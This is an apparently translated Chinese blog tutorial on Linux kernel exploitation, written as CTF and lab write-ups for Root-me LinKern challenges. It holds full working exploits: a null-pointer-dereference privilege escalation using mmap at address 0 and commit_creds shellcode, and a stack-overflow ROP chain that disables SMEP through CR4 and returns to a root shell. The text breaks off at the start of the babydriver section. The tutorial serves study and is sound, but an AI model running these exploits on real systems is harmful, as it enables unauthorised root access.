# Kernel Pwn 学习之路(二)

阅读量 **741340**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-03-30 16:00:37

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t012b90699683ce2270.jpg)

## 0x01 前言

由于关于Kernel安全的文章实在过于繁杂，本文有部分内容大篇幅或全文引用了参考文献，若出现此情况的，将在相关内容的开头予以说明，部分引用参考文献的将在文件结尾的参考链接中注明。

Kernel的相关知识以及栈溢出在Kernel中的利用已经在Kernel Pwn
学习之路(一)给予了说明，本文主要介绍了Kernel中更多的利用思路以及更多的实例。

【传送门】：[Kernel Pwn 学习之路(一)](https://www.anquanke.com/post/id/201043)

## 0x02 关于x64下内核gdb连接失败的解决方案

我们在用GDB调试x64内核时可能会回显`Remote 'g' packet reply is too long:`的错误，形如：

![](https://img.lhyerror404.cn/error404/2020-03-20-112125.png)

那么在网上查到的大多数解决方案都是使用源码重编译安装`GDB`，然后修改`remote.c`，将其从

    
    
    if (buf_len > 2 * rsa->sizeof_g_packet)
        error (_("Remote 'g' packet reply is too long: %s"), rs->buf);
    

修改为：

    
    
    if (buf_len > 2 * rsa->sizeof_g_packet) {
    //error (_("Remote 'g' packet reply is too long: %s"), rs->buf);
        rsa->sizeof_g_packet = buf_len ;
        for (i = 0; i < gdbarch_num_regs (gdbarch); i++) {
            if (rsa->regs->pnum == -1)
                continue;
            if (rsa->regs->offset >= rsa->sizeof_g_packet)
                rsa->regs->in_g_packet = 0;
            else
                rsa->regs->in_g_packet = 1;
        } 
    }
    

但事实上我们只需要在连接前使用GDB命令设置架构即可成功连接：

    
    
    set architecture i386:x86-64:intel
    

## 0x03 关于4.15.*以上内核中kallsyms的新保护

首先，我们知道在`/proc/kallsyms`函数中将存放了大量关键的函数的真实地址，这无疑是十分危险的，而低版本内核也提供了一些保护措施如`kptr_restrict`保护，但是在4.15.*以上内核中，内核新增了一个保护机制，我们首先来跟进`/source/kernel/kallsyms.c`：

    
    
    /*
     * We show kallsyms information even to normal users if we've enabled
     * kernel profiling and are explicitly not paranoid (so kptr_restrict
     * is clear, and sysctl_perf_event_paranoid isn't set).
     *
     * Otherwise, require CAP_SYSLOG (assuming kptr_restrict isn't set to
     * block even that).
     */
    int kallsyms_show_value(void)
    {
        switch (kptr_restrict) {
        case 0:
            if (kallsyms_for_perf())
                return 1;
        /* fallthrough */
        case 1:
            if (has_capability_noaudit(current, CAP_SYSLOG))
                return 1;
        /* fallthrough */
        default:
            return 0;
        }
    }
    

可以发现，在4.15.*以上内核中，`kptr_restrict`只有`0`和`1`两种取值，此处我们不对`kptr_restrict=1`的情况分析，继续跟进`kallsyms_for_perf()`:

    
    
    static inline int kallsyms_for_perf(void)
    {
    #ifdef CONFIG_PERF_EVENTS
        extern int sysctl_perf_event_paranoid;
        if (sysctl_perf_event_paranoid <= 1)
            return 1;
    #endif
        return 0;
    }
    

这里看到了，我们要同时保证`sysctl_perf_event_paranoid`的值小于等于1才可以成功的查看`/proc/kallsyms`，而在默认情况下，这个标志量的值为`2`。

## 0x04 劫持重要结构体进行攻击

### 劫持`tty struct`控制程序流程

ptmx设备是tty设备的一种，当使用open函数打开时，通过系统调用进入内核，创建新的文件结构体，并执行驱动设备自实现的open函数。

我们可以在`/source/drivers/tty/pty.c`中找到它的相关实现(`Line 786`)：

    
    
    /**
     *    ptmx_open        -    open a unix 98 pty master
     *    @inode: inode of device file
     *    @filp: file pointer to tty
     *
     *    Allocate a unix98 pty master device from the ptmx driver.
     *
     *    Locking: tty_mutex protects the init_dev work. tty->count should
     *        protect the rest.
     *        allocated_ptys_lock handles the list of free pty numbers
     */
    
    static int ptmx_open(struct inode *inode, struct file *filp)
    {
        struct pts_fs_info *fsi;
        struct tty_struct *tty;
        struct dentry *dentry;
        int retval;
        int index;
    
        nonseekable_open(inode, filp);
    
        /* We refuse fsnotify events on ptmx, since it's a shared resource */
        filp->f_mode |= FMODE_NONOTIFY;
    
        retval = tty_alloc_file(filp);
        if (retval)
            return retval;
    
        fsi = devpts_acquire(filp);
        if (IS_ERR(fsi)) {
            retval = PTR_ERR(fsi);
            goto out_free_file;
        }
    
        /* find a device that is not in use. */
        mutex_lock(&devpts_mutex);
        index = devpts_new_index(fsi);
        mutex_unlock(&devpts_mutex);
    
        retval = index;
        if (index < 0)
            goto out_put_fsi;
    
    
        mutex_lock(&tty_mutex);
        tty = tty_init_dev(ptm_driver, index);
        /* The tty returned here is locked so we can safely
           drop the mutex */
        mutex_unlock(&tty_mutex);
    
        retval = PTR_ERR(tty);
        if (IS_ERR(tty))
            goto out;
    
        /*
         * From here on out, the tty is "live", and the index and
         * fsi will be killed/put by the tty_release()
         */
        set_bit(TTY_PTY_LOCK, &tty->flags); /* LOCK THE SLAVE */
        tty->driver_data = fsi;
    
        tty_add_file(tty, filp);
    
        dentry = devpts_pty_new(fsi, index, tty->link);
        if (IS_ERR(dentry)) {
            retval = PTR_ERR(dentry);
            goto err_release;
        }
        tty->link->driver_data = dentry;
    
        retval = ptm_driver->ops->open(tty, filp);
        if (retval)
            goto err_release;
    
        tty_debug_hangup(tty, "opening (count=%d)n", tty->count);
    
        tty_unlock(tty);
        return 0;
    err_release:
        tty_unlock(tty);
        // This will also put-ref the fsi
        tty_release(inode, filp);
        return retval;
    out:
        devpts_kill_index(fsi, index);
    out_put_fsi:
        devpts_release(fsi);
    out_free_file:
        tty_free_file(filp);
        return retval;
    }
    

可以看到，tty结构体的申请在`Line 47`，通过`tty_init_dev(ptm_driver,
index);`来实现的，那么经过交叉引用的查看可以发现这个函数在`/source/drivers/tty/tty_io.c#L1292`中实现：

    
    
    struct tty_struct *tty_init_dev(struct tty_driver *driver, int idx)
    {
        struct tty_struct *tty;
        int retval;
    
        /*
         * First time open is complex, especially for PTY devices.
         * This code guarantees that either everything succeeds and the
         * TTY is ready for operation, or else the table slots are vacated
         * and the allocated memory released.  (Except that the termios
         * may be retained.)
         */
    
        if (!try_module_get(driver->owner))
            return ERR_PTR(-ENODEV);
    
        tty = alloc_tty_struct(driver, idx);
        if (!tty) {
            retval = -ENOMEM;
            goto err_module_put;
        }
    
        tty_lock(tty);
        retval = tty_driver_install_tty(driver, tty);
        if (retval < 0)
            goto err_free_tty;
    
        if (!tty->port)
            tty->port = driver->ports[idx];
    
        WARN_RATELIMIT(!tty->port,
                "%s: %s driver does not set tty->port. This will crash the kernel later. Fix the driver!n",
                __func__, tty->driver->name);
    
        retval = tty_ldisc_lock(tty, 5 * HZ);
        if (retval)
            goto err_release_lock;
        tty->port->itty = tty;
    
        /*
         * Structures all installed ... call the ldisc open routines.
         * If we fail here just call release_tty to clean up.  No need
         * to decrement the use counts, as release_tty doesn't care.
         */
        retval = tty_ldisc_setup(tty, tty->link);
        if (retval)
            goto err_release_tty;
        tty_ldisc_unlock(tty);
        /* Return the tty locked so that it cannot vanish under the caller */
        return tty;
    
    err_free_tty:
        tty_unlock(tty);
        free_tty_struct(tty);
    err_module_put:
        module_put(driver->owner);
        return ERR_PTR(retval);
    
        /* call the tty release_tty routine to clean out this slot */
    err_release_tty:
        tty_ldisc_unlock(tty);
        tty_info_ratelimited(tty, "ldisc open failed (%d), clearing slot %dn",
                     retval, idx);
    err_release_lock:
        tty_unlock(tty);
        release_tty(tty, idx);
        return ERR_PTR(retval);
    }
    

继续分析可以发现程序在`Line 17`通过`alloc_tty_struct(driver,
idx);`来分配一个`tty_struct`结构体，经过交叉引用的查看可以发现这个函数在`/source/drivers/tty/tty_io.c#L2800`中实现：

    
    
    struct tty_struct *alloc_tty_struct(struct tty_driver *driver, int idx)
    {
        struct tty_struct *tty;
    
        tty = kzalloc(sizeof(*tty), GFP_KERNEL);
        if (!tty)
            return NULL;
    
        kref_init(&tty->kref);
        tty->magic = TTY_MAGIC;
        tty_ldisc_init(tty);
        tty->session = NULL;
        tty->pgrp = NULL;
        mutex_init(&tty->legacy_mutex);
        mutex_init(&tty->throttle_mutex);
        init_rwsem(&tty->termios_rwsem);
        mutex_init(&tty->winsize_mutex);
        init_ldsem(&tty->ldisc_sem);
        init_waitqueue_head(&tty->write_wait);
        init_waitqueue_head(&tty->read_wait);
        INIT_WORK(&tty->hangup_work, do_tty_hangup);
        mutex_init(&tty->atomic_write_lock);
        spin_lock_init(&tty->ctrl_lock);
        spin_lock_init(&tty->flow_lock);
        spin_lock_init(&tty->files_lock);
        INIT_LIST_HEAD(&tty->tty_files);
        INIT_WORK(&tty->SAK_work, do_SAK_work);
    
        tty->driver = driver;
        tty->ops = driver->ops;
        tty->index = idx;
        tty_line_name(driver, idx, tty->name);
        tty->dev = tty_get_device(tty);
    
        return tty;
    }
    

程序最终的分配函数是`kzalloc`函数，该函数定义在`/source/include/linux/slab.h#L686`。

    
    
    /**
     * kzalloc - allocate memory. The memory is set to zero.
     * @size: how many bytes of memory are required.
     * @flags: the type of memory to allocate (see kmalloc).
     */
    static inline void *kzalloc(size_t size, gfp_t flags)
    {
        return kmalloc(size, flags | __GFP_ZERO);
    }
    

可以看到，最后实际上还是调用了`kmalloc`函数。（关于`kmalloc`函数使用的`slab`分配器将会在之后的文章中给予说明）

`kmalloc`函数定义在`/source/include/linux/slab.h#L487`。

    
    
    /**
     * kmalloc - allocate memory
     * @size: how many bytes of memory are required.
     * @flags: the type of memory to allocate.
     *
     * kmalloc is the normal method of allocating memory
     * for objects smaller than page size in the kernel.
     *
     * The @flags argument may be one of:
     *
     * %GFP_USER - Allocate memory on behalf of user.  May sleep.
     *
     * %GFP_KERNEL - Allocate normal kernel ram.  May sleep.
     *
     * %GFP_ATOMIC - Allocation will not sleep.  May use emergency pools.
     *   For example, use this inside interrupt handlers.
     *
     * %GFP_HIGHUSER - Allocate pages from high memory.
     *
     * %GFP_NOIO - Do not do any I/O at all while trying to get memory.
     *
     * %GFP_NOFS - Do not make any fs calls while trying to get memory.
     *
     * %GFP_NOWAIT - Allocation will not sleep.
     *
     * %__GFP_THISNODE - Allocate node-local memory only.
     *
     * %GFP_DMA - Allocation suitable for DMA.
     *   Should only be used for kmalloc() caches. Otherwise, use a
     *   slab created with SLAB_DMA.
     *
     * Also it is possible to set different flags by OR'ing
     * in one or more of the following additional @flags:
     *
     * %__GFP_HIGH - This allocation has high priority and may use emergency pools.
     *
     * %__GFP_NOFAIL - Indicate that this allocation is in no way allowed to fail
     *   (think twice before using).
     *
     * %__GFP_NORETRY - If memory is not immediately available,
     *   then give up at once.
     *
     * %__GFP_NOWARN - If allocation fails, don't issue any warnings.
     *
     * %__GFP_RETRY_MAYFAIL - Try really hard to succeed the allocation but fail
     *   eventually.
     *
     * There are other flags available as well, but these are not intended
     * for general use, and so are not documented here. For a full list of
     * potential flags, always refer to linux/gfp.h.
     */
    static __always_inline void *kmalloc(size_t size, gfp_t flags)
    {
        if (__builtin_constant_p(size)) {
            if (size > KMALLOC_MAX_CACHE_SIZE)
                return kmalloc_large(size, flags);
    #ifndef CONFIG_SLOB
            if (!(flags & GFP_DMA)) {
                int index = kmalloc_index(size);
    
                if (!index)
                    return ZERO_SIZE_PTR;
    
                return kmem_cache_alloc_trace(kmalloc_caches[index],
                        flags, size);
            }
    #endif
        }
        return __kmalloc(size, flags);
    }
    

我们现在只需要明确，`kmalloc`其实是使用`slab/slub`分配器，现在多见的是`slub`分配器。这个分配器通过一个多级的结构进行管理。首先有`cache`层，`cache`是一个结构，里边通过保存空对象，部分使用的对象和完全使用中的对象来管理，对象就是指内存对象，也就是用来分配或者已经分配的一部分内核空间。

**`slab`分配器严格按照`cache`去区分，不同`cache`的无法分配在一页内，`slub`分配器则较为宽松，不同`cache`如果分配相同大小，可能会在一页内。**

那么我们若能通过UAF漏洞劫持一个`tty_struct`我们就能劫持其内部的所有函数指针，进而控制程序流程。

关于`tty_struct`的定义位于`/source/include/linux/tty.h#L282`：

    
    
    struct tty_struct {
        int    magic;
        struct kref kref;
        struct device *dev;
        struct tty_driver *driver;
        const struct tty_operations *ops;
        int index;
    
        /* Protects ldisc changes: Lock tty not pty */
        struct ld_semaphore ldisc_sem;
        struct tty_ldisc *ldisc;
    
        struct mutex atomic_write_lock;
        struct mutex legacy_mutex;
        struct mutex throttle_mutex;
        struct rw_semaphore termios_rwsem;
        struct mutex winsize_mutex;
        spinlock_t ctrl_lock;
        spinlock_t flow_lock;
        /* Termios values are protected by the termios rwsem */
        struct ktermios termios, termios_locked;
        struct termiox *termiox;    /* May be NULL for unsupported */
        char name[64];
        struct pid *pgrp;        /* Protected by ctrl lock */
        struct pid *session;
        unsigned long flags;
        int count;
        struct winsize winsize;        /* winsize_mutex */
        unsigned long stopped:1,    /* flow_lock */
                  flow_stopped:1,
                  unused:BITS_PER_LONG - 2;
        int hw_stopped;
        unsigned long ctrl_status:8,    /* ctrl_lock */
                  packet:1,
                  unused_ctrl:BITS_PER_LONG - 9;
        unsigned int receive_room;    /* Bytes free for queue */
        int flow_change;
    
        struct tty_struct *link;
        struct fasync_struct *fasync;
        wait_queue_head_t write_wait;
        wait_queue_head_t read_wait;
        struct work_struct hangup_work;
        void *disc_data;
        void *driver_data;
        spinlock_t files_lock;        /* protects tty_files list */
        struct list_head tty_files;
    
    #define N_TTY_BUF_SIZE 4096
    
        int closing;
        unsigned char *write_buf;
        int write_cnt;
        /* If the tty has a pending do_SAK, queue it here - akpm */
        struct work_struct SAK_work;
        struct tty_port *port;
    } __randomize_layout;
    

我们接下来重点关注`tty_struct -> ops`，它的类型是`const struct
tty_operations`，这个结构体的定义位于`/source/include/linux/tty_driver.h#L253`：

    
    
    struct tty_operations {
        struct tty_struct * (*lookup)(struct tty_driver *driver,
                struct file *filp, int idx);
        int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
        int  (*open)(struct tty_struct * tty, struct file * filp);
        void (*close)(struct tty_struct * tty, struct file * filp);
        void (*shutdown)(struct tty_struct *tty);
        void (*cleanup)(struct tty_struct *tty);
        int  (*write)(struct tty_struct * tty,
                  const unsigned char *buf, int count);
        int  (*put_char)(struct tty_struct *tty, unsigned char ch);
        void (*flush_chars)(struct tty_struct *tty);
        int  (*write_room)(struct tty_struct *tty);
        int  (*chars_in_buffer)(struct tty_struct *tty);
        int  (*ioctl)(struct tty_struct *tty,
                unsigned int cmd, unsigned long arg);
        long (*compat_ioctl)(struct tty_struct *tty,
                     unsigned int cmd, unsigned long arg);
        void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
        void (*throttle)(struct tty_struct * tty);
        void (*unthrottle)(struct tty_struct * tty);
        void (*stop)(struct tty_struct *tty);
        void (*start)(struct tty_struct *tty);
        void (*hangup)(struct tty_struct *tty);
        int (*break_ctl)(struct tty_struct *tty, int state);
        void (*flush_buffer)(struct tty_struct *tty);
        void (*set_ldisc)(struct tty_struct *tty);
        void (*wait_until_sent)(struct tty_struct *tty, int timeout);
        void (*send_xchar)(struct tty_struct *tty, char ch);
        int (*tiocmget)(struct tty_struct *tty);
        int (*tiocmset)(struct tty_struct *tty,
                unsigned int set, unsigned int clear);
        int (*resize)(struct tty_struct *tty, struct winsize *ws);
        int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
        int (*get_icount)(struct tty_struct *tty,
                    struct serial_icounter_struct *icount);
        void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
    #ifdef CONFIG_CONSOLE_POLL
        int (*poll_init)(struct tty_driver *driver, int line, char *options);
        int (*poll_get_char)(struct tty_driver *driver, int line);
        void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
    #endif
        const struct file_operations *proc_fops;
    } __randomize_layout;
    

通常，我们希望劫持`ioctl`这个函数指针。

## 0x05 以[Root-me]LinKern x86 – Null pointer dereference为例

🏅：本题考查点 – Null pointer dereference in Kernel

本漏洞的相关说明已在Kernel Pwn 学习之路(一)中说明，此处不再赘述。

###  Init 文件分析

![](https://img.lhyerror404.cn/error404/2020-03-17-065056.png)

内核仍未开启任何保护。

###  LKMs 文件分析

![](https://img.lhyerror404.cn/error404/2020-03-17-113344.png)

仅开启了NX保护。

####  题目逻辑分析

#####  tostring_write

函数首先打印`"Tostring: write()n"`，然后调用`kmalloc`分配一个Chunk。

>
> `kmalloc`函数用于在内核中分配`Chunk`，它有两个参数，第一个参数是`Size`，第二个参数称为`flag`，通过其以几个方式控制`kmalloc`的行为。
>
> 由于`kmalloc`函数可以最终通过调用 `__get_free_pages` 来进行，因此，这些`flag`通常带有 `GFP_` 前缀。
>
> 最通常使用的标志是`GFP_KERNEL`, 这意味着此次分配是由运行在内核空间的进程进行的。换言之,
> 这意味着调用函数的是一个进程在尝试执行一个系统调用。
>
> 使用 `GFP_KENRL` 将意味着`kmalloc`能够使当前进程在内存不足的情况下执行睡眠操作来等待一页. 一个使用`GFP_KERNEL`
> 来分配内存的函数必须是可重入的并且不能在原子上下文中运行. 若当前进程睡眠, 内核将采取正确的动作来定位一些空闲内存,
> 或者通过刷新缓存到磁盘或者交换出去一个用户进程的内存。
>
> `GFP_KERNEL`不一定是正确分配标志; 有时`kmalloc`从一个进程的上下文的外部进行调用。这类的调用可能发生在中断处理, tasklet,
> 和内核定时器中. 在这个情况下, 当前进程不应当被置为睡眠, 并且驱动应当使用一个
> `GFP_ATOMIC`标志来代替`GFP_KERNEL`。此时，内核将正常地试图保持一些空闲页以便来满足原子分配。
>
> 当使用`GFP_ATOMIC`时，`kmalloc`甚至能够使用最后一个空闲页。如果最后一个空闲页也不存在将会导致分配失败。
>
> 除此之外，还有如下的标志可供我们选择(更完整的标志列表请查阅`linux/gfp.h`)：
>
> `GFP_USER` – 由用户态的程序来分配内存，可以使用睡眠等待机制。
>
> `GFP_HIGHUSER` – 从高地址分配内存。
>
> `GFP_NOIO` – 分配内存时禁止使用任何I/O操作。
>
> `GFP_NOFS` – 分配内存时禁止调用fs寄存器。
>
> `GFP_NOWAIT` – 立即分配，不做等待。
>
> `__GFP_THISNODE` – 仅从本地节点分配内存。
>
> `GFP_DMA` – 进行适用于`DMA`的分配，这应该仅应用于`kmalloc`缓存，否则请使用`SLAB_DMA`创建的`slab`。

此处程序使用的是`GFP_DMA`标志。

在那之后，程序将用户传入的数据向该`Chunk`写入`length`个字节，并将末尾置零。

然后程序验证我们传入数据的前十个字节是否为`*`，若是，程序会从第十一字节开始逐字节进行扫描，根据不同的’命令’执行不同的操作。

在那之后程序会从第十一字节开始间隔一个`x00`或`n`字节进行扫描，根据不同的’命令’执行不同的操作。

    
    
    H ： 将tostring->tostring_read这个函数指针置为tostring_read_hexa。
    D ： 将tostring->tostring_read这个函数指针置为tostring_read_dec。
    S ： 将tostring结构体清除，所有的成员变量置为NULL或0，释放tostring->tostring_stack指向的chunk。
    N ： 首先调用local_strtoul(bufk+i+11,NULL,10)，若此时tostring->tostring_stack为NULL，则执行tostring结构体的初始化，将local_strtoul(bufk+i+11,NULL,10)的返回值乘1024作为size调用kmalloc函数将返回地址作为tostring->tostring_stack所指向的值，同时设置pointer_max这个成员变量的值为size/sizeof(long long int)，设置tostring->tostring_read这个函数指针为tostring_read_hexa。
    

否则，程序将会在`tostring->tostring_stack`中插入后续的值。

#####  tostring_read

程序将直接调用tostring->tostring_read这个函数指针

####  题目漏洞分析

程序在调用tostring->tostring_read这个函数指针时没有做指针有效性验证，这将导致程序试图调用一个空指针，而在此版本的Kernel中，程序已经关闭了`mmap_min_addr`的保护，这将导致我们可以`mmap`一个0地址处的内存映射，若我们能在0地址处写入shellcode，程序将会在调用空指针时调用此位置的shellcode，于是可以直接提权。

我们的目标是调用`commit_creds(prepare_kernel_cred(0))`，那么我们的shellcode就可以是：

    
    
    xor eax,eax;
    call commit_creds;
    call prepare_kernel_cred;
    ret;
    

其中`commit_creds`和`prepare_kernel_cred`函数的地址可以在`/proc/kallsyms`中定位到。

![](https://img.lhyerror404.cn/error404/2020-03-17-154625.png)

可以使用`Radare2`生成`shellcode`:

    
    
    rasm2 "xor eax,eax ; call 0xC10711F0 ; call 0xC1070E80 ; ret;"
    

####  动态调试验证

首先`QEMU`的启动指令为：

    
    
    qemu-system-i386 -s 
    -kernel bzImage 
    -append nokaslr 
    -initrd initramfs.img 
    -fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/error404/Desktop/CTF_question/Kernel/Null_pointer_dereference/Share 
    -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme
    

然后在`QEMU`使用以下命令确定相关`Section`的地址：

    
    
    lsmod
    grep 0 /sys/module/[module_name]/sections/.text
    grep 0 /sys/module/[module_name]/sections/.data
    grep 0 /sys/module/[module_name]/sections/.bss
    
    # 0xC8824000
    # 0xC88247E0
    # 0xC8824A80
    

![](https://img.lhyerror404.cn/error404/2020-03-17-142717.png)

在IDA和GDB中进行设置：

![](https://img.lhyerror404.cn/error404/2020-03-17-145415.png)

![](https://img.lhyerror404.cn/error404/2020-03-17-145454.png)

⚠️ **：在IDA设置后会导致反编译结果出错，请谨慎设置！**

    
    
    # code in gdb
    add-symbol-file tostring.ko 0xC8824000 -s .data 0xC88247E0 -s .bss 0xC8824A80
    

首先验证我们分析的逻辑是正确的。

我们构建如下PoC发送：

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <string.h>
    #include <stdint.h>
    
    int main(void){
        int fd = open("/dev/tostring",2);
        write(fd,"**********H",11);
        write(fd,"**********D",11);
        write(fd,"**********S",11);
        write(fd,"**********N",11);
        write(fd,"AAAABBBB",9);
        return 0;
    }
    
    //gcc -m32 -static -o Exploit Exploit.c
    

预期情况下，程序应当依次执行H、D、S、N四个命令，并在最后写入”AAAABBBB”。

![](https://img.lhyerror404.cn/error404/2020-03-17-151755.png)

发现逻辑正确，那么我们尝试劫持EIP，发送以下PoC：

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    
    char payload[] = "xe9xeaxbexadx0b"; // jmp 0xbadbeef
    
    int main(void){
        char Get_shell[20] ; 
        mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memcpy(0, payload, sizeof(payload));
        int fd = open("/dev/tostring",2);
        write(fd,"**********S",11);
        read(fd,Get_shell,sizeof(Get_shell));
        return 0;
    }
    
    //gcc -m32 -static -o Exploit Exploit.c
    

成功劫持，那么我们只需要替换掉Shellcode即可完成提权。

![](https://img.lhyerror404.cn/error404/2020-03-17-154020.png)

###  Final Exploit

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    
    char payload[] = "x31xc0xe8xe9x11x07xc1xe8x74x0ex07xc1xc3";
    
    int main(void){
        char Get_shell[20] ; 
        mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memcpy(0, payload, sizeof(payload));
        int fd = open("/dev/tostring",2);
        write(fd,"**********S",11);
        read(fd,Get_shell,sizeof(Get_shell));
        system("/bin/sh");
        return 0;
    }
    
    //gcc -m32 -static -o Exploit Exploit.c
    

## 0x06 以[Root-me]LinKern x86 – basic ROP为例

🏅：本题考查点 – ROP in Kernel、Bypass SMEP

###  调试信息

`QEMU`启动指令：

    
    
    qemu-system-i386 -s 
    -kernel bzImage 
    -append nokaslr 
    -initrd initramfs.img 
    -fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/error404/Desktop/CTF_question/Kernel/basic_ROP/Share 
    -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme 
    -cpu kvm64,+smep
    

几个重要的地址：

    
    
    .text : 0xC8824000
    .data : 0xC88241A0
    .bss  : 0xC8824440
    
    # code in gdb
    add-symbol-file tostring.ko 0xC8824000 -s .data 0xC88241A0 -s .bss 0xC8824440
    

###  Init 文件分析

![](https://img.lhyerror404.cn/error404/2020-03-18-035501.png)

还是正常加载LKMs，但是这次没有关闭`mmap_min_addr`防护。

根据题目说明，本次内核启动了`SMEP`保护，这将导致当程序进入`Ring 0`的内核态时，不得执行用户空间的代码。

**⭕️：检测`smep`是否开启可以使用以下命令：**

![](https://img.lhyerror404.cn/error404/2020-03-18-071736.png)

###  LKMs文件分析

![](https://img.lhyerror404.cn/error404/2020-03-18-040316.png)

和往常一样，用户态仅开启了NX保护。

####  题目逻辑分析&漏洞分析

本次题目逻辑很简单，就是一个简单的读入操作，当我们向内核发送数据时有一个很明显的栈溢出会发生。

![](https://img.lhyerror404.cn/error404/2020-03-18-060204.png)

程序在向buf写入值时并没有做最大size限制，于是我们可以很容易的触发栈溢出。

###  控制EIP

我们若发送以下PoC，程序应该会断在`0xdeadbeef`：

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    
    int main(void){
        char Send_data[0x30];
        char Padding[0x29] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        char Eip[4] = "xEFxBExADxDE";
        strcat(Send_data,Padding);
        strcat(Send_data,Eip);
        int fd = open("/dev/bof",2);
        write(fd,Send_data,0x30);
        return 0;
    }
    
    //gcc -m32 -static -o Exploit Exploit.c
    

发现符合预期。

![](https://img.lhyerror404.cn/error404/2020-03-18-113010.png)

那么因为`SMEP`的存在我们不能再使用和`Buffer overflow basic
1`相同的思路，也就是说，执行完`commit_creds(prepare_kernel_cred(0));`后将不被允许继续执行用户态代码。

###  Bypass SMEP

内核是根据`CR4`寄存器的值来判断`smep`保护是否开启的，当`CR4`寄存器的第`20`位是`1`时，保护开启；是`0`时，保护关闭。以下是`CR4`寄存器的各标志位：

![](https://img.lhyerror404.cn/error404/2020-03-18-072543.jpg)

那么，如果在内核中存在`gadget`能让我们修改`CR4`寄存器的值我们就可以手动来关闭`SMEP`保护了。

首先我们需要从`bzImage`中提取静态编译未经过压缩的`kernel`文件，以协助我们找到合适的`gadget`。

这里使用[extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux)来提取，使用命令为:`./extract-vmlinux bzImage > vmlinux`

![](https://img.lhyerror404.cn/error404/2020-03-18-073450.png)

接下来由于`vmlinux`过大，因此建议把分析出的`gadget`重定向到文件然后在文件中寻找`gadget`而不是直接以标准输出打印，命令为`ROPgadget
--binary ./vmlinux > gadgets`。

发现程序中有四个`mov cr4,eax`的`gadget`，同时也有`pop
eax`的`gadget`，于是我们可以利用这两个`gadget`控制`cr4`寄存器的值为`0x6d0`进而关闭`SMEP`保护了。

于是我们最终选用的两个`gadget`分别为：

    
    
    0xc10174fc : pop eax ; ret
    0xc1045053 : mov cr4, eax ; pop ebp ; ret
    

于是此时的PoC为：

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    int main(void){
        char Get_shell[5];
        init_tf_work();
        *((void**)(Get_shell)) = &payload;
        char Payload[0x100] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxFCx74x01xC1xD0x06x00x00x53x50x04xC1x00x00x00x00xEFxBExADxDE";
        for(int i = 0,j = 56;i < 4;i++,j++){
            Payload[j] = Get_shell[i];
        }
        int fd = open("/dev/bof",2);
        write(fd,Payload,0x100);
        return 0;
    }
    
    //gcc -m32 -static -o Exploit Exploit.c
    

可以发现，此时，`CR4`寄存器的值已置为`0x6D0`

![](https://img.lhyerror404.cn/error404/2020-03-18-113125.png)

###  Final Exploit

    
    
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdint.h>
    #include <fcntl.h>
    #include <string.h>
    
    struct trap_frame{
        void *eip;
        uint32_t cs;
        uint32_t eflags;
        void *esp;
        uint32_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    static char receive[256];
    void get_shell(void){
        execl("/bin/sh", "sh", NULL);
    }
    void init_tf_work(void){
        asm("pushl %cs;popl tf+4;"    //set cs
            "pushfl;popl tf+8;"       //set eflags
            "pushl %esp;popl tf+12;"
            "pushl %ss;popl tf+16;");
        tf.eip = &get_shell;
        tf.esp -= 1024;
    }
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xC10711F0;
    void* (*commit_creds)(void*) KERNCALL = (void*) 0xC1070E80;
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("mov $tf,%esp;"
              "iret;");
    }
    int main(void){
        char Get_shell[5];
        init_tf_work();
        *((void**)(Get_shell)) = &payload;
        char Payload[0x100] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxFCx74x01xC1xD0x06x00x00x53x50x04xC1x00x00x00x00";
        for(int i = 0,j = 56;i < 4;i++,j++){
            Payload[j] = Get_shell[i];
        }
        int fd = open("/dev/bof",2);
        write(fd,Payload,0x100);
        return 0;
    }
    
    //gcc -m32 -static -o Exploit Exploit.c
    

## 0x07 以CISCN2017 – babydriver为例

🏅：本题考查点 – UAF in Kernel

根据`boot.sh`所示，程序开启了`SMEP`保护。

###  Init文件分析

    
    
    #!/bin/sh
    
